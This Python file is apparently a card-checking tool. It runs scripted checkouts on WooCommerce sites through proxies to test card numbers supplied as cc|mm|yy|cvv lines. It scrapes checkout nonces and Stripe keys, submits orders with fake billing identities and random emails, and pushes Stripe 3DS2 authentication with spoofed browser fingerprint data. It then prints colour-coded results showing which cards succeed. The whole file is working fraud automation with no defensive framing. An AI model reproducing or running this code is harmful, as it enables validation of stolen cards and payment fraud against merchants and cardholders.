import requests
import random
import string
import base64
import json
import re

def stripTags(input_string):
    cleaned = re.sub(r'</?[^>]+(>|$)', '', input_string)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned

def stripe_cc_api(domain, creditCard, proxy):
    G = "\033[38;5;82m"
    Y ="\033[38;5;226m"
    R2 = "\033[38;5;202m"
    R = "\033[0m"
    cc, mm, yy, cvv = creditCard.strip().split('|')
    session = requests.Session()

    if proxy:
        session.proxies = proxy

    #requests 1
    try:
        url = f"https://{domain}/?=&post_type=product"

        response = session.get(url, proxies=proxy)
        split_text = response.text.split('data-product_id="')
        if len(split_text) > 1:
            id = split_text[1].split('"')[0]
        else:
            return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} Product ID not found in the response.")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 1 An error occurred during processing: {e}")

    #requests 2
    try:
        url = f"https://{domain}/?wc-ajax=add_to_cart"
        data = {
            'quantity': 1,
            'add-to-cart': id
        }

        response = session.post(url, data=data, proxies=proxy)

        if response.status_code not in (200, 302):
            return print(f'[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} Failed to add item to cart.')

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 2 An error occurred during processing: {e}")
    
    #requests 3
    try:
        url = f"https://{domain}/checkout/"
        response = session.get(url, proxies=proxy)

        split_text = response.text.split('name="woocommerce-process-checkout-nonce" value="')
        if len(split_text) > 1:
            checkoutNonce = split_text[1].split('"')[0]
        else:
            return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} Checkout nonce not found in the response.")
        
        split_text = response.text.split('"api_key":"')
        if len(split_text) > 1:
            pk = split_text[1].split('"')[0]
        else:
            return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} pk not found in the response.")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 3 An error occurred during processing: {e}")
    
    #requests 4
    try:
        url = f"https://api.stripe.com/v1/payment_methods"
        data = {
            'type': 'card',
            'card[number]': f'{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]}',
            'card[exp_year]': yy[-2:],
            'card[exp_month]': mm,
            'key': pk
        }

        response = session.post(url, data=data, proxies=proxy)
    
        if response.status_code == 200:
            pm = stripTags(json.loads(response.text)["id"])
        elif 'error' in response.text:
            message = json.loads(response.text).get("error", {}).get("message")
            return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} {message}")
        else:
            return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} {response.text}")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 4 An error occurred during processing: {e}")
    
    #requests 5
    try:
        url = f"https://{domain}/?wc-ajax=checkout"
        data = {
            'billing_first_name': 'Danyka',
            'billing_last_name': 'Kunde',
            'billing_country': 'US',
            'billing_address_1': '90154 Alanna Rapid Suite 080',
            'billing_city': 'New York',
            'billing_state': 'NY',
            'billing_postcode': '10080',
            'billing_phone': '5809662076',
            'billing_email': ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '@gmail.com',
            'payment_method': 'stripe_cc',
            'stripe_cc_token_key': pm,
            'woocommerce-process-checkout-nonce': checkoutNonce
        }

        response = session.post(url, data=data, proxies=proxy)
    
        if response.status_code == 200:
            status = stripTags(json.loads(response.text)["result"])
        
        if 'success' in status:
            redirect = stripTags(json.loads(response.text)["redirect"])
            decoded_str = base64.urlsafe_b64decode((redirect.replace('#response=', '').replace('%3D', '=') + '=' * ((4 - len(redirect.replace('#response=', '').replace('%3D', '=')) % 4) % 4))).decode('utf-8')
            client_secret = json.loads(decoded_str)["client_secret"]
            pi = json.loads(decoded_str)["client_secret"].split('_secret')[0]

            #requests 6
            try:
                url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
                data = {
                    'payment_method': pm,
                    'expected_payment_method_type': 'card',
                    'use_stripe_sdk': 'true',
                    'key': pk,
                    'client_secret': client_secret
                }

                response = session.post(url, data=data, proxies=proxy)

                three_d_secure_2_source = stripTags(json.loads(response.text)["next_action"]["use_stripe_sdk"]["three_d_secure_2_source"])
                server_transaction_id = base64.b64encode(f'{{"threeDSServerTransID":"{stripTags(json.loads(response.text)["next_action"]["use_stripe_sdk"]["server_transaction_id"])}"}}'.encode('utf-8')).decode('utf-8')

                if three_d_secure_2_source is None:
                    return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} three_d_secure_2_source not found in the response.")
                elif server_transaction_id is None:
                    return print(f"[{R2}!{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} server_transaction_id not found in the response.")

            except Exception as e:
                return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 6 An error occurred during processing: {e}")
            
            #requests 7
            try:
                url = f"https://api.stripe.com/v1/3ds2/authenticate"
                data = f"source={three_d_secure_2_source}&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22{server_transaction_id}%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%221080%22%2C%22browserScreenWidth%22%3A%221920%22%2C%22browserTZ%22%3A%22+480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F131.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key={pk}"

                response = session.post(url, data=data, proxies=proxy)

                if response.status_code == 200:
                    state = stripTags(json.loads(response.text)["state"])

                if 'challenge_required' in state:
                    return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} {state}")

                elif 'failed'in response.text:
                    return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} {state}")
                
            except Exception as e:
                return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 7 An error occurred during processing: {e}")
            
            #requests 8
            try:
                url = f"https://api.stripe.com/v1/payment_intents/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
                response = session.get(url, proxies=proxy)

                if response.status_code == 200:
                    status = stripTags(json.loads(response.text)["status"])
                    decline_code = stripTags(json.loads(response.text).get("last_payment_error", {}).get("decline_code", ""))

                if 'succeeded' in status:
                    return print(f"[{G}+{R}] {domain} {G}{cc}|{mm}|{yy}|{cvv}{R} {status}")
                elif 'requires_payment_method' in status:
                    return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} {decline_code}")
                else:
                    return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} {response.text}")

            except Exception as e:
                return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} requests 8 An error occurred during processing: {e}")

        elif 'failure' in status:
            message = stripTags(json.loads(response.text)["messages"])
            return print(f"[{R2}-{R}] {domain} {R2}{cc}|{mm}|{yy}|{cvv}{R} {message}")
        else:
            return print(f"[{Y}!{R}] {domain} {Y}{cc}|{mm}|{yy}|{cvv}{R} {response.text}")

    except Exception as e:
        return print(f"[{Y}!{R}] {domain} {cc}|{mm}|{yy}|{cvv} requests 5 An error occurred during processing: {e}")